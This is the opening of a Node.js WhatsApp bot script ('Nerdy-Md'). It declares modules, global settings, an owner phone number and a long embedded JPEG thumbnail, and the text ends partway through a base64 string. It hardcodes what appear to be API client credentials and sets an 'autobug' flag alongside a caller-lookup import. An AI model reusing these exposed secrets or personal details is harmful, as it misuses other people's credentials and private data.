require('./settings')
const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { smsg, getGroupAdmins, getBuffer, formatp, fetchJson, getSizeMedia, tanggal, isUrl, formatDate, getTime,  sleep, clockString, jsonformat, format, parseMention, getRandom, generateProfilePicturee } = require('./lib/myfunc')
const { exec } = require('child_process')
const speed = require('performance-now')
const request= require('request')
const { writeFile } = require('fs').promises;
const fs = require('fs')
const path = require('path')
const { youtubeSearch } = require('@bochilteam/scraper')
const cheerio = require ("cheerio")
const hx = require("hxz-api")
const ytdl = require('ytdl-secktor')
const { tlang } = require('./lib/scraper')
const yts = require("yt-search");
const axios = require('axios')
const instagramGetUrl = require("fg-ig")    
const FileType = require('file-type')
const truecallerjs = require('truecallerjs');
const textpro = require('./lib/textpro')
const maker = require('mumaker')
const fetch = require('node-fetch')
const ytv = require('./lib/y2mate.js')
const { igs, ig} = require('./neoxrApi.js')
const util = require('util')
const {getPost, getStalk, getStory, skbuffer} = require('raganork-bot');
autobug = false
AUTO_PP = false
AUTO_PPP = false

videotime = 6000 // 100 min
dlsize = 100 // 100mb
//bot bomdy 

global.igfg = '▢ Sígueme en Instagram\nhttps://www.instagram.com/fg98._\n' 
global.dygp = 'https://chat.whatsapp.com/IO9jmpI72ejHiN4unRZleU'
global.fgsc = 'https://github.com/FG98F/dylux-fg' 
global.fgyt = 'https://youtube.com/fg98f'
global.fgpyp = 'https://paypal.me/fg98f'
global.fglog = 'https://i.imgur.com/Owmb93c.png' 
global.owner = ['919995595067']
global.ownertag = '919995595067' //ur tag number
global.botname = 'Nerdy-Md' //ur bot name
global.linkz = "https://youtube.com/channel/UCqxQRy1f51HzIa7Ri-jmdTw" //your theme url which will be displayed on whatsapp
global.websitex = "https://github.com/SISACO" //ur website to be displayed
global.botscript = 'https://github.com/SISACO/Sisaco-MD4' //script link
global.reactmoji = "💜" //ur menu react emoji
global.themeemoji = "💜" //ur theme emoji
global.packname = "Sisaco\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n💜jasmine " //ur sticker watermark packname
global.author = "515400" //ur sticker watermark author


clientid= `ecabce07bbaea28da999f191858d79f1`
clients = `43a636b9b5bb104e58044d6577eba876f662ef78638385e72290259e4d13ea8d`
fake = ""
thu = "255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,226,2,40,73,67,67,95,80,82,79,70,73,76,69,0,1,1,0,0,2,24,0,0,0,0,2,16,0,0,109,110,116,114,82,71,66,32,88,89,90,32,0,0,0,0,0,0,0,0,0,0,0,0,97,99,115,112,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,246,214,0,1,0,0,0,0,211,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,100,101,115,99,0,0,0,240,0,0,0,116,114,88,89,90,0,0,1,100,0,0,0,20,103,88,89,90,0,0,1,120,0,0,0,20,98,88,89,90,0,0,1,140,0,0,0,20,114,84,82,67,0,0,1,160,0,0,0,40,103,84,82,67,0,0,1,160,0,0,0,40,98,84,82,67,0,0,1,160,0,0,0,40,119,116,112,116,0,0,1,200,0,0,0,20,99,112,114,116,0,0,1,220,0,0,0,60,109,108,117,99,0,0,0,0,0,0,0,1,0,0,0,12,101,110,85,83,0,0,0,88,0,0,0,28,0,115,0,82,0,71,0,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,89,90,32,0,0,0,0,0,0,111,162,0,0,56,245,0,0,3,144,88,89,90,32,0,0,0,0,0,0,98,153,0,0,183,133,0,0,24,218,88,89,90,32,0,0,0,0,0,0,36,160,0,0,15,132,0,0,182,207,112,97,114,97,0,0,0,0,0,4,0,0,0,2,102,102,0,0,242,167,0,0,13,89,0,0,19,208,0,0,10,91,0,0,0,0,0,0,0,0,88,89,90,32,0,0,0,0,0,0,246,214,0,1,0,0,0,0,211,45,109,108,117,99,0,0,0,0,0,0,0,1,0,0,0,12,101,110,85,83,0,0,0,32,0,0,0,28,0,71,0,111,0,111,0,103,0,108,0,101,0,32,0,73,0,110,0,99,0,46,0,32,0,50,0,48,0,49,0,54,255,219,0,67,0,6,4,5,6,5,4,6,6,5,6,7,7,6,8,10,16,10,10,9,9,10,20,14,15,12,16,23,20,24,24,23,20,22,22,26,29,37,31,26,27,35,28,22,22,32,44,32,35,38,39,41,42,41,25,31,45,48,45,40,48,37,40,41,40,255,219,0,67,1,7,7,7,10,8,10,19,10,10,19,40,26,22,26,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,255,192,0,17,8,0,90,0,160,3,1,34,0,2,17,1,3,17,1,255,196,0,28,0,0,1,4,3,1,0,0,0,0,0,0,0,0,0,0,0,4,2,3,5,6,0,1,7,8,255,196,0,71,16,0,2,1,2,5,1,5,5,4,6,6,8,7,0,0,0,1,2,3,4,17,0,5,6,18,33,49,19,34,65,81,97,7,20,50,113,129,35,82,145,161,8,21,22,66,147,210,67,85,130,193,209,240,36,51,98,114,131,146,177,225,53,83,115,162,178,194,241,255,196,0,27,1,0,2,3,1,1,1,0,0,0,0,0,0,0,0,0,0,1,4,2,3,5,0,6,7,255,196,0,49,17,0,1,3,3,1,5,6,6,3,1,1,0,0,0,0,0,1,0,2,17,3,4,33,49,5,18,65,81,97,19,20,113,145,161,240,6,34,129,177,209,225,50,66,193,22,82,255,218,0,12,3,1,0,2,17,3,17,0,63,0,245,69,189,113,155,70,55,140,199,33,1,85,53,150,182,200,52,147,70,153,221,83,197,52,139,189,34,72,153,203,45,237,224,44,62,167,28,230,179,219,254,74,103,217,151,101,85,147,47,222,149,214,43,253,6,236,71,126,148,146,229,194,171,35,90,137,72,170,142,57,89,163,239,45,208,145,180,238,10,71,85,110,58,243,143,59,87,86,81,73,90,19,45,142,85,117,38,196,220,150,22,241,185,176,252,49,206,46,2,66,45,164,199,106,189,19,83,237,253,0,251,28,137,71,171,86,95,255,0,166,44,222,204,189,168,201,172,53,17,203,166,160,134,153,59,6,145,89,36,44,73,4,113,200,242,39,30,81,158,142,190,150,158,58,138,170,119,142,158,66,2,187,120,220,92,91,240,199,77,253,30,234,68,30,209,242,176,79,118,81,36,103,235,27,91,243,3,20,50,187,156,96,149,55,219,49,162,64,202,245,214,207,44,107,96,191,55,195,152,204,49,42,157,192,147,176,99,97,109,211,27,198,96,74,150,232,90,177,243,198,0,124,241,188,102,57,116,45,21,191,207,8,49,2,121,231,14,99,48,101,2,208,82,22,48,60,241,205,53,14,180,146,45,73,89,149,208,103,84,148,213,41,17,100,167,120,212,219,237,4,32,151,60,3,218,3,113,201,218,65,227,174,58,118,35,235,50,60,166,182,105,37,172,202,232,106,37,144,109,119,150,157,29,152,121,18,71,61,7,225,129,40,134,129,162,231,20,218,179,50,168,120,4,90,134,137,217,228,177,134,209,43,42,180,114,72,151,39,142,66,160,244,55,7,210,56,235,77,82,153,142,88,175,45,39,234,217,154,160,85,214,123,213,53,233,217,12,161,83,179,182,230,190,197,239,14,57,199,80,26,91,79,135,222,50,44,168,63,222,247,56,239,227,233,234,127,19,140,58,95,79,149,218,114,60,168,175,60,26,72,252,122,248,122,156,114,43,159,166,171,205,26,162,48,117,5,7,102,101,40,71,217,238,96,92,42,159,134,192,14,210,50,121,191,197,199,7,8,246,99,174,235,245,70,127,85,69,89,33,136,210,207,217,180,51,198,35,146,68,120,123,88,220,41,69,35,199,232,1,253,225,110,134,52,190,64,172,24,100,121,80,96,111,113,73,31,175,167,169,252,113,33,29,13,36,85,146,213,197,75,2,85,202,0,146,101,140,7,112,0,0,22,234,120,3,240,24,228,8,5,64,126,222,105,175,235,68,254,19,255,0,46,51,246,243,77,127,89,167,240,164,254,92,121,131,223,36,243,198,123,220,158,103,25,157,249,220,149,29,163,151,80,246,241,152,105,125,85,166,34,52,245,93,182,101,75,32,104,68,104,202,204,172,108,203,114,182,183,67,253,156,112,55,203,35,57,151,191,71,74,229,135,122,64,183,218,7,67,126,60,124,199,158,39,51,90,151,49,129,115,124,55,17,49,101,51,59,57,251,103,72,249,62,23,185,255,0,160,199,161,217,214,194,233,172,53,56,240,233,43,22,235,108,214,183,168,234,108,3,81,158,62,194,158,151,41,131,59,203,133,36,251,225,142,27,88,33,28,88,113,212,99,52,14,80,186,119,87,101,153,141,69,125,58,83,65,82,172,66,146,236,22,252,222,195,202,253,48,198,97,90,176,67,79,12,168,74,203,16,94,188,31,35,249,224,127,125,141,102,165,166,8,177,172,169,176,122,16,71,63,142,52,157,240,171,26,247,186,157,88,28,4,105,200,19,42,207,250,154,149,41,53,175,165,46,140,153,214,56,196,127,171,212,75,175,244,203,15,252,77,127,133,39,242,225,95,183,186,107,250,205,127,133,39,242,227,203,254,245,34,150,82,72,101,37,72,245,24,223,189,201,247,142,60,125,75,170,148,158,88,246,193,24,43,81,149,203,218,28,52,43,211,255,0,183,186,107,250,205,127,133,39,242,225,138,223,104,89,4,80,90,142,168,213,213,200,194,56,41,227,137,195,75,35,27,42,139,139,114,72,235,143,51,251,219,253,227,139,87,178,86,74,175,105,185,34,212,144,66,9,228,141,91,197,196,77,111,200,177,250,96,210,187,115,222,27,10,109,168,226,97,118,74,169,38,167,205,114,186,12,219,85,84,82,103,217,161,115,77,71,75,18,52,61,197,46,194,197,9,42,0,61,226,203,115,210,215,182,27,90,237,79,28,89,245,85,109,101,13,60,121,51,149,23,132,246,117,104,177,44,172,228,222,233,112,224,120,216,171,124,92,99,146,107,49,168,181,7,181,124,246,92,134,146,190,90,252,170,88,227,134,74,125,170,105,81,80,17,222,123,47,120,179,182,211,123,134,60,17,139,21,126,162,175,175,253,27,36,204,164,154,90,252,207,49,148,211,205,34,198,55,200,94,171,179,42,85,0,31,5,144,0,60,176,216,169,36,136,209,91,42,225,73,168,243,76,219,78,102,58,163,41,170,38,154,6,113,77,64,97,12,181,33,20,93,1,225,131,180,155,144,27,219,167,7,7,206,106,150,163,46,143,63,212,147,101,185,190,102,229,41,40,104,182,20,12,170,88,168,220,140,95,104,7,115,27,15,151,141,67,83,201,154,104,237,3,163,244,182,159,133,106,117,44,243,69,63,187,41,94,255,0,100,194,121,143,36,119,75,128,189,111,102,56,102,170,121,181,214,162,160,206,116,236,147,100,26,247,35,133,131,229,25,213,51,118,82,70,215,13,200,181,212,238,35,122,30,132,92,14,45,48,81,86,230,205,42,19,59,25,29,126,183,202,224,205,139,5,74,72,233,85,39,112,69,212,128,206,111,199,36,129,110,184,139,214,186,146,155,71,76,105,234,53,86,113,83,158,52,66,106,122,19,70,37,142,98,88,170,43,118,112,247,67,50,149,23,96,124,121,197,11,217,164,181,250,135,219,99,86,231,113,162,102,116,230,166,162,166,36,29,216,158,53,20,251,7,39,133,220,5,238,111,107,225,19,230,177,103,30,223,34,158,165,135,185,174,110,180,169,126,128,194,165,19,241,149,111,245,197,93,182,1,230,97,13,229,213,235,106,235,105,78,86,218,139,82,28,159,51,204,229,16,210,208,211,196,146,71,218,31,220,36,169,103,181,192,44,10,139,144,60,69,247,65,85,168,51,77,69,153,228,245,21,162,133,178,184,161,147,222,105,225,82,149,102,93,251,78,214,190,208,2,16,86,253,79,91,117,165,103,212,181,218,147,244,136,163,164,104,228,247,60,158,56,42,75,88,237,68,0,200,27,202,237,33,85,254,193,251,184,179,102,26,186,42,92,131,218,30,163,203,138,202,249,100,143,71,3,14,68,146,69,10,16,63,139,35,47,211,22,3,50,140,163,100,212,185,130,230,147,105,97,52,50,234,29,235,178,100,136,170,138,114,161,154,114,164,155,109,229,109,126,90,195,139,224,140,234,182,171,72,26,42,154,220,241,234,232,42,42,82,153,163,172,137,123,75,176,38,234,232,20,112,20,155,21,61,58,224,93,81,155,229,89,60,20,218,155,46,137,31,60,212,17,210,101,84,14,121,47,218,57,49,241,228,59,70,118,243,10,7,150,40,31,164,6,114,101,213,25,86,83,19,18,148,52,230,166,78,127,164,144,237,91,250,133,70,63,219,196,106,212,236,216,92,131,140,9,92,179,199,215,25,140,61,60,186,248,99,94,150,198,10,89,57,78,183,118,36,113,129,181,59,136,242,154,46,8,70,155,180,38,221,44,8,24,45,55,18,234,190,2,195,12,107,105,35,138,154,150,141,108,100,218,163,240,235,249,227,99,101,23,54,238,158,239,48,182,118,133,38,139,23,49,220,7,217,49,168,173,83,150,163,198,224,181,48,81,193,244,7,251,176,38,96,226,74,12,190,184,92,152,216,110,227,155,98,217,164,244,42,102,244,180,239,95,153,36,16,85,202,118,70,172,47,37,147,162,223,163,11,222,214,60,12,65,102,217,109,94,81,60,249,52,244,242,3,28,157,199,149,54,134,91,219,127,150,211,199,56,246,148,62,34,177,188,186,169,105,73,255,0,59,70,68,30,4,140,115,136,204,47,3,83,102,87,183,164,202,174,31,41,62,132,37,211,200,213,19,74,237,19,164,110,110,142,84,128,222,4,124,197,173,244,195,253,151,158,44,58,254,166,105,90,150,170,9,123,76,186,138,115,75,44,104,128,109,149,71,199,242,110,245,190,158,99,17,4,6,60,88,142,183,234,8,199,207,46,238,157,125,187,126,230,238,246,147,32,25,130,12,70,99,49,7,235,140,47,66,202,34,216,155,112,103,118,51,206,80,189,157,254,88,106,166,73,104,194,213,211,73,52,85,52,228,73,12,144,182,215,87,29,54,159,243,229,137,13,190,3,144,60,188,240,133,136,61,125,4,110,46,141,87,22,240,71,59,67,130,223,144,56,71,181,220,27,220,178,174,166,210,247,134,142,42,247,158,201,171,87,40,247,61,93,237,34,135,47,164,156,24,216,123,180,49,180,227,197,123,79,179,39,175,59,64,62,125,113,95,202,96,212,122,83,75,85,103,154,107,86,71,5,3,76,126,194,24,21,225,157,59,78,205,100,93,251,130,179,88,112,7,144,221,198,24,246,141,156,81,85,83,201,45,86,79,155,84,84,210,211,59,65,93,16,101,167,128,184,6,229,183,0,220,133,191,116,244,182,23,158,77,80,52,222,73,147,83,211,212,204,144,24,214,99,4,69,236,99,140,11,53,186,93,218,255,0,53,56,199,161,180,47,220,41,62,165,83,36,231,13,136,25,49,199,34,53,94,130,181,128,97,168,3,103,112,112,153,146,99,238,163,243,90,76,207,57,200,91,88,230,217,228,217,133,100,51,118,83,134,143,178,146,148,43,217,74,50,16,22,215,86,238,170,240,196,245,235,107,162,204,181,229,70,151,162,154,167,93,174,93,21,107,246,113,37,100,49,44,141,25,4,173,165,219,187,121,10,72,29,108,71,122,248,175,105,42,245,89,51,26,35,26,79,67,93,18,59,69,32,186,179,30,225,4,30,187,148,139,255,0,185,136,205,87,155,156,249,106,43,167,27,232,169,226,97,75,27,11,130,15,87,35,205,172,45,228,0,30,120,108,93,95,186,187,168,181,240,38,119,160,104,70,27,30,60,117,128,147,52,169,83,183,109,203,191,182,35,168,212,171,78,91,166,106,244,161,76,242,155,92,211,229,118,78,204,212,165,34,186,186,185,6,196,187,144,215,32,30,151,184,196,22,81,165,42,51,92,190,122,250,156,238,130,155,42,89,164,43,153,53,247,77,182,66,59,80,46,161,46,195,174,235,131,244,37,221,77,85,183,46,202,178,120,237,216,209,94,224,116,180,40,35,95,161,44,127,229,195,212,239,71,89,166,50,188,155,48,111,176,154,24,164,48,172,187,26,66,161,101,113,199,36,2,224,144,8,63,158,18,239,119,194,131,94,234,164,239,59,255,0,45,195,68,201,2,53,241,199,221,62,205,152,218,149,221,64,55,44,0,235,196,198,61,81,218,135,63,214,57,70,83,76,35,215,82,230,185,13,90,152,210,174,8,225,14,8,7,187,218,168,44,110,21,172,225,175,221,61,60,83,167,116,166,115,62,139,146,138,61,66,114,236,183,50,43,83,38,88,212,139,42,240,84,169,44,72,101,36,42,19,107,117,177,7,21,234,186,249,51,204,198,147,40,146,141,104,242,186,7,18,181,16,0,179,170,247,80,27,113,181,183,0,2,223,134,38,231,139,76,199,156,138,141,70,213,169,155,65,80,82,147,176,20,81,58,49,139,116,168,94,70,33,201,185,33,86,219,71,22,250,219,113,127,180,5,38,180,84,135,228,147,0,227,128,210,36,241,83,181,217,76,175,80,184,127,18,67,70,99,63,218,38,14,60,208,26,119,35,204,43,41,215,50,173,207,166,202,178,220,158,121,5,45,68,146,180,171,19,70,251,89,162,87,109,145,166,228,183,78,109,107,99,90,162,42,169,107,98,207,103,206,6,119,79,155,17,182,184,194,33,98,202,182,85,40,0,0,109,67,98,0,232,120,241,48,57,109,54,85,45,94,97,83,154,170,52,52,172,103,49,57,178,72,236,206,73,34,224,51,11,0,23,247,139,15,12,74,214,215,85,230,173,11,85,44,112,83,193,254,166,154,46,240,67,107,2,79,23,54,224,88,0,1,233,227,135,5,75,179,94,11,201,103,17,0,13,48,6,164,158,178,7,69,151,85,148,27,109,188,112,227,166,100,224,234,120,1,234,129,29,219,1,226,58,117,198,18,123,69,176,4,249,121,96,185,98,167,142,98,173,42,111,54,22,99,254,120,192,115,77,4,103,111,188,70,73,186,216,183,3,215,15,52,206,139,48,18,12,132,245,45,92,73,42,153,17,130,134,5,136,231,21,189,105,152,198,217,220,79,29,156,57,10,183,54,176,30,56,150,146,72,201,49,172,177,146,214,219,225,138,118,165,149,63,92,69,112,89,99,80,45,235,115,141,157,141,38,233,167,150,85,247,23,85,43,210,117,55,231,11,161,123,54,85,169,213,116,65,216,180,34,41,164,40,27,139,136,152,95,231,206,1,213,185,213,85,85,26,83,14,217,234,32,154,97,12,207,33,109,209,111,39,101,190,128,12,61,164,170,215,34,35,49,142,159,182,145,98,146,46,204,61,129,220,45,193,183,92,66,173,68,117,113,202,246,216,194,82,202,15,94,241,228,95,235,141,235,205,153,81,155,66,181,253,65,1,180,193,97,159,236,55,247,189,12,25,214,86,5,181,219,13,179,45,154,102,94,119,129,28,49,30,163,135,36,118,89,169,42,61,218,103,152,164,163,50,33,101,87,28,6,14,8,107,120,17,208,124,135,150,38,32,152,108,132,9,161,77,242,44,102,89,152,162,70,165,128,222,196,2,108,7,38,192,240,49,69,169,150,72,101,90,114,164,70,100,220,128,14,3,120,254,54,197,198,139,189,18,51,109,104,220,16,65,241,184,242,198,102,216,169,102,235,90,102,131,0,46,32,152,198,141,13,35,208,15,162,98,221,149,133,98,106,153,3,30,102,127,210,187,45,15,177,138,215,80,115,28,254,20,83,241,37,45,37,207,252,236,196,127,237,197,91,82,251,47,212,52,249,220,144,228,217,102,105,91,150,196,160,67,82,213,148,170,238,252,19,39,197,25,75,30,0,183,153,36,220,1,103,208,126,212,41,50,109,15,44,57,232,169,171,170,202,218,40,98,74,112,175,45,68,14,219,99,96,9,0,149,248,91,155,247,65,234,214,196,171,251,111,200,74,145,79,147,234,9,165,183,17,251,170,33,252,93,192,252,240,135,101,108,89,192,2,181,128,108,72,85,92,131,216,246,119,153,49,125,93,155,77,69,150,16,68,180,176,204,162,89,82,220,163,152,192,69,82,58,252,119,23,233,215,20,92,224,65,62,117,90,114,26,250,212,201,196,165,40,212,75,103,40,160,13,221,165,183,144,72,36,93,137,218,87,22,173,101,237,11,58,213,80,53,28,176,38,81,146,200,8,146,158,57,123,73,167,31,118,71,22,1,124,213,111,127,22,34,227,21,87,10,183,71,185,32,95,131,211,211,211,242,198,109,207,119,13,20,168,180,71,56,10,111,188,171,50,30,100,241,146,134,20,175,29,141,21,76,208,56,1,25,134,215,47,243,14,15,60,158,122,245,177,231,24,212,145,181,24,167,81,246,91,118,88,11,127,249,130,67,20,64,73,3,127,3,203,214,252,127,118,20,110,174,92,89,148,120,143,243,207,225,133,52,50,150,47,113,1,164,224,33,4,18,52,236,213,149,18,84,59,47,102,11,133,184,91,147,110,232,23,228,158,77,207,60,158,152,101,242,229,151,178,90,169,167,157,34,238,193,190,192,195,211,163,40,6,253,209,201,55,224,115,198,15,11,102,93,155,109,107,131,210,247,249,248,99,20,132,101,29,198,185,191,119,145,243,192,16,52,26,41,26,181,9,36,184,231,94,168,38,130,172,204,29,179,42,194,251,12,64,221,126,11,244,248,109,212,158,247,197,115,193,198,132,29,138,198,244,83,53,36,145,174,213,100,68,60,113,197,152,16,71,3,168,234,48,123,15,138,195,161,240,55,252,60,49,167,60,221,92,223,111,64,214,219,142,1,160,68,8,240,8,154,245,75,131,139,140,142,170,61,41,166,130,25,41,225,171,153,41,106,55,118,200,17,8,144,178,217,141,202,221,110,0,6,222,88,37,80,247,110,13,172,45,199,225,133,108,42,192,56,54,54,248,69,190,132,140,47,108,123,194,41,6,246,220,167,254,216,150,6,129,69,213,28,240,3,140,198,138,170,110,173,39,104,164,109,31,21,201,252,240,60,212,157,170,142,1,114,47,255,0,108,29,74,132,185,96,46,57,59,111,115,249,225,27,84,144,160,139,191,222,226,223,218,190,52,195,160,225,5,91,153,4,114,109,27,183,30,134,248,132,169,44,103,36,252,64,241,139,205,69,42,72,172,25,172,203,200,39,144,113,10,114,42,137,101,251,13,178,22,228,14,111,255,0,76,105,89,94,54,147,247,157,201,76,71,21,33,146,231,52,240,229,193,37,112,46,71,104,206,164,5,54,243,233,215,2,211,177,90,215,90,25,35,148,145,185,74,183,23,240,231,7,101,153,28,143,72,209,84,70,164,6,222,80,114,91,165,177,47,69,146,71,51,69,73,24,236,90,121,22,27,220,141,155,136,91,145,197,250,225,251,207,136,141,122,70,223,116,25,196,248,172,230,108,218,116,170,246,140,63,69,7,36,179,29,236,76,130,32,108,27,106,134,86,191,75,91,158,47,225,214,220,248,97,248,235,107,212,109,223,40,42,191,106,163,111,119,200,142,57,240,227,159,28,92,63,82,188,236,171,5,121,148,82,54,219,195,144,171,0,71,28,216,216,224,42,154,42,154,58,170,105,232,234,233,234,205,114,56,42,217,106,196,70,194,1,0,0,199,196,249,116,199,156,20,94,227,186,32,159,17,248,94,149,219,73,186,247,90,99,232,122,117,233,234,85,112,189,116,243,211,201,181,154,120,238,98,98,170,1,75,114,91,142,15,94,191,236,241,198,29,90,220,204,165,146,90,142,207,117,146,225,55,95,201,133,190,92,241,227,233,137,170,140,163,48,137,13,29,66,193,28,82,29,192,246,72,121,55,54,45,217,250,30,58,140,14,42,106,13,68,7,181,167,46,151,88,194,211,71,215,129,255,0,151,234,63,28,23,90,213,31,200,122,133,22,109,102,184,7,182,222,145,30,24,226,121,245,244,10,52,215,102,105,35,151,158,101,218,0,149,84,167,7,195,111,28,139,243,110,120,227,174,30,163,171,204,61,246,8,170,42,153,110,215,147,181,117,41,178,254,61,57,183,133,250,250,96,249,94,174,37,122,149,170,142,53,168,5,155,108,17,116,2,215,248,70,19,74,107,42,160,74,72,171,201,138,34,187,126,194,62,233,28,142,152,29,210,161,224,60,255,0,72,58,253,206,97,104,161,76,72,137,140,232,4,140,235,137,241,41,233,243,35,5,97,85,40,244,183,177,149,57,140,19,110,55,94,202,69,199,4,91,145,207,32,96,124,219,52,106,121,137,134,178,22,86,64,34,239,161,84,243,12,189,111,228,71,67,214,194,231,25,36,149,82,102,148,211,201,89,43,86,50,17,23,250,50,110,101,61,109,207,61,14,2,204,114,72,164,169,247,138,154,167,103,154,242,155,67,211,204,240,227,6,149,155,167,231,255,0,61,253,86,115,90,234,114,92,7,213,109,115,102,73,74,251,210,236,141,78,229,53,40,73,110,44,111,251,203,215,142,182,245,182,27,253,100,192,70,166,165,55,57,222,246,169,81,184,120,109,55,238,31,67,227,111,246,176,138,92,130,142,173,75,193,84,225,68,125,168,38,18,65,81,200,35,237,48,175,217,152,4,64,150,159,111,93,230,153,182,145,252,92,49,221,90,56,123,243,87,138,174,63,48,13,242,28,231,239,233,141,22,54,115,35,52,210,37,108,104,238,221,154,176,145,108,22,221,10,121,223,247,184,29,124,45,133,156,213,77,207,189,198,18,21,178,70,213,27,138,155,117,39,250,65,233,107,218,222,56,220,186,102,146,34,128,200,89,153,67,220,68,194,215,255,0,141,233,141,65,166,105,10,202,229,216,132,82,72,49,183,60,127,234,224,119,102,76,71,219,242,187,125,220,135,144,240,247,231,170,110,44,200,48,138,38,170,138,220,60,128,213,109,14,121,232,223,187,205,187,188,139,143,43,226,201,151,84,138,252,190,41,89,149,166,126,55,241,102,177,183,94,131,235,138,224,211,180,151,191,124,175,221,218,64,255,0,231,137,188,132,26,122,6,166,91,36,48,207,36,119,28,94,204,69,250,222,255,0,92,43,117,69,173,102,243,121,170,235,57,206,25,3,200,15,178,147,169,167,142,93,142,169,21,228,190,221,247,7,252,253,48,48,202,173,119,137,213,172,191,104,60,19,228,111,253,216,126,118,61,149,0,185,177,228,139,245,233,133,40,180,246,29,47,211,8,181,206,3,5,46,163,151,46,143,183,85,46,89,207,136,22,31,44,24,144,69,18,147,77,29,156,92,72,75,94,199,229,140,176,106,234,128,194,224,1,96,124,48,244,228,170,38,210,69,219,155,98,78,113,58,174,77,193,27,65,182,71,65,119,189,138,177,221,243,182,30,162,80,153,141,8,78,242,10,152,155,115,47,63,24,241,235,131,106,73,247,91,220,220,48,231,233,136,89,29,153,24,150,36,132,36,18,122,96,82,116,184,21,192,171,37,14,119,158,229,178,138,106,74,28,199,176,134,185,231,38,56,216,44,139,115,199,94,122,159,76,5,83,91,89,79,93,146,102,21,20,149,20,243,31,124,99,17,67,184,43,48,83,193,243,4,243,235,138,45,61,76,239,19,23,154,86,55,241,98,112,91,67,20,205,25,154,52,144,129,198,229,7,26,54,244,41,219,86,53,216,50,103,212,202,118,234,227,189,80,54,239,104,0,198,154,224,66,179,197,93,52,212,145,82,60,114,108,73,218,101,44,182,10,10,183,3,241,232,113,170,17,67,27,229,19,207,73,55,109,11,21,168,113,188,110,85,32,198,69,186,91,158,71,60,124,177,15,87,151,81,8,16,138,58,96,118,245,17,47,248,97,252,179,44,160,120,142,250,42,86,249,196,167,251,177,109,205,78,240,209,189,34,57,30,145,251,241,74,218,49,150,131,228,108,235,175,95,113,224,137,167,29,131,196,86,57,54,108,148,108,32,183,87,4,6,224,158,58,223,205,70,27,203,209,161,164,142,155,176,120,196,110,26,225,64,86,189,253,58,139,241,254,241,192,117,121,101,0,50,218,134,148,90,246,180,75,254,24,42,76,167,45,253,83,68,255,0,171,232,247,155,221,187,21,185,231,229,130,46,55,64,0,99,223,225,54,219,157,198,118,97,184,247,249,43,116,170,240,212,229,50,148,125,180,177,162,181,199,60,51,147,249,48,196,94,127,71,52,212,116,240,211,198,210,17,24,136,218,64,130,215,95,136,249,113,208,96,217,50,186,5,142,34,180,52,160,150,177,180,43,207,229,134,43,178,218,21,151,187,71,76,57,29,34,95,47,150,33,74,184,166,233,3,132,123,199,85,77,106,134,187,75,95,196,207,172,161,178,186,70,164,174,175,34,56,226,133,160,40,172,211,3,115,224,20,120,11,0,45,233,139,53,46,120,33,138,154,54,100,17,38,91,37,19,47,104,188,187,6,59,250,245,221,179,147,247,65,240,3,0,77,151,209,10,62,41,41,197,155,194,37,255,0,12,55,13,29,41,165,55,166,132,217,184,238,12,115,175,103,49,235,250,80,166,225,77,187,173,8,118,120,150,58,101,53,20,228,172,8,140,123,101,234,47,127,28,42,58,138,117,134,117,53,84,192,178,16,7,108,189,108,125,112,186,8,98,53,0,24,208,143,45,163,18,158,239,8,172,142,209,70,46,134,253,209,138,205,232,105,157,223,95,210,38,183,69,8,106,169,135,90,186,81,255,0,29,63,199,15,228,47,20,176,215,152,101,70,45,83,46,210,36,0,16,91,192,142,184,44,34,172,210,109,85,28,120,15,92,61,78,138,41,165,96,160,48,61,109,206,40,173,112,42,51,116,8,250,254,148,95,83,120,66,255,217"
lol= ""
tu= "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAKAAoAMBIgACEQEDEQH/xAAcAAADAAMBAQEAAAAAAAAAAAAAAQIDBAUGBwj/xAA6EAABBAECBAMFBgUDBQAAAAABAAIDEQQFIRIxQVETYXEGFCKBoQcjMpGxwRVCgtHwM1JyU5K